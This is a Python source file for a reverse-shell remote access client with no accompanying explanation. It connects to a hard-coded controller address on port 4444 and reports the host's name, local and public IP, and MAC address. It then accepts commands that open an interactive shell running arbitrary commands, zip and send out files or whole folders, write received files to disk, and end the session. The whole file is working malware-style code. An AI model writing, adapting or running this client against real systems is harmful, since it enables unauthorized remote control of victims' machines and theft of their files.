import platform
import shutil
import socket
import sys
import urllib.request
import json
import uuid
import struct
import subprocess
import os


IP = "192.168.0.53"
PORT = 4444
ARC = platform.system()

def send(sock, data):
    if isinstance(data, str):
        data = data.encode()
    data_size = len(data)
    sock.sendall(struct.pack('>I', data_size)) 
    sock.sendall(data) 

def recv(sock):
    data_size = recvall(sock, 4)  
    if not data_size:
        return None 
    data_len = struct.unpack(">I", data_size)[0]  
    return recvall(sock, data_len)

def recvall(sock, n):
    packet = b'' 
    while len(packet) < n:
        frame = sock.recv(n - len(packet))  
        if not frame:
            return None  
        packet += frame  
    return packet  

def get_ip_info(sock):
        try:
            lip = str(socket.gethostbyname(socket.gethostname()))
            res = urllib.request.urlopen('https://api.ipify.org?format=json', timeout=3)
            data = json.loads(res.read().decode())
            pip = data.get('ip', 'Unknown')
            ips = {
                "pip": pip,
                "lip": lip
            }
            output = json.dumps(ips).encode()
            send(sock, output)
        except Exception as e:
            print(f"Error IP info: {e}") 

def upload(sock, path):
    if os.path.exists(path):
        file_name = os.path.basename(path)
        try:
            if os.path.isdir(path):
                zip_file = shutil.make_archive(file_name, 'zip', path)
                with open(zip_file, "rb") as f:
                    file_data = f.read()
                os.remove(zip_file)
                send(sock, f"FILE_NAME: {file_name}.zip".encode())
                send(sock, file_data)
            else:
                with open(path, "rb") as f:
                    file_data = f.read()
                send(sock, f"FILE_NAME: {file_name}".encode())
                send(sock, file_data)
        except Exception as e:
            send(sock, f"ERROR: Could not read file. {str(e)}".encode())
    else:
        send(sock, "ERROR: File or folder not found.".encode())

def download(sock, path):
    save_dir = os.getcwd()
    full_save_path = os.path.normpath(os.path.join(save_dir, path))
    if not save_dir or not path:
        return
    try:
        data = recv(sock)
        with open(full_save_path, 'wb') as f:
            f.write(data)
        send(sock, f"File saved in {save_dir}".encode())
    except Exception as e:
        send(sock, "ERROR: Failed to upload the file".encode())

def kill_connection(sock):
        sock.close()
        sys.exit()

def handle_shell(sock):
     while True:
        cmd = recv(sock).decode()
        if cmd == "exit_shell":
            break
        try:
            if cmd.startswith("cd"):
                dir = cmd[3:].strip()
                if not dir:
                    send(sock, f"$ {os.getcwd()}\nEND_OF_OUTPUT".encode())
                    continue
                try:
                    os.chdir(dir)
                    send(sock, f"$ {os.getcwd()}\nEND_OF_OUTPUT".encode())
                except FileNotFoundError:
                    send(sock, f"cd: No such directory\nEND_OF_OUTPUT".encode())
                continue
            else:
                proc = subprocess.Popen(
                    cmd,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    stdin=subprocess.PIPE
                )
                for line in proc.stdout:
                    send(sock, line)
                send(sock, b"END_OF_OUTPUT")      
        except Exception as e:
            send(sock, f"Error: {str(e)}\n".encode())
            send(sock, b"END_OF_OUTPUT")

def handle_cmd(sock):
    try:
        while True:
            cmd = recv(sock).decode()
            if not cmd or cmd == None:
                continue
            try:
                if cmd == "getip":
                    get_ip_info(sock)
                
                elif cmd == "shell":
                    handle_shell(sock)

                elif cmd.startswith("download "):
                    path = cmd[len("download "):].strip()
                    upload(sock, path)

                elif cmd.startswith("upload "):
                    path = cmd[len("upload "):].strip()
                    download(sock, path)
                    
                elif cmd.lower() == "kill":
                    kill_connection(sock)
                    
                else:
                    response = f"Received cmd: {cmd}"
                    print(response)
            except socket.error as e:
                print(f"Error cmd: {e}")
                sock.close()
                sys.exit(0)
                break
                
    except Exception as e:
        print(f"\nCommand handler error: {e}")
        sock.close()
        sys.exit(0)

def gsi():
        try:
            hn = platform.node()
            lip = str(socket.gethostbyname(socket.gethostname()))
            m = uuid.getnode()
            mc = ':'.join(['{:02x}'.format((m >> ele) & 0xff) for ele in range(40, -1, -8)])
            output = {
                "lip": lip,
                "hname": hn,
                "mac": mc
            }
            return json.dumps(output).encode()
        except Exception as e:
            return f"Error getting info: {e}".encode()
        

def main():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((IP, PORT))
        info = gsi()
        send(sock, info)
        print("Connected to server...")

        handle_cmd(sock)

    except Exception as e:
        print(f"Connection error: {e}")
        exit(1)

if __name__ == "__main__":
    main()
